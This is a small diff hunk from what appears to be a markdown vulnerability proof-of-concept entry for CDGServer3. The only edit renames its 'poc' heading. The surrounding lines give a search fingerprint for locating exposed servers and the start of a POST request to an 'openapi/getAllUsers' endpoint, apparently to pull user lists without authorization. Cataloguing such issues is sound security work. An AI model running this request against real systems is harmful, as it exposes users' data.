@@ -8,7 +8,7 @@
 body="/CDGServer3/index.jsp"	
 ```
 
-## poc
+## POC
 
 ```java
 POST /CDGServer3/openapi/getAllUsers HTTP/1.1
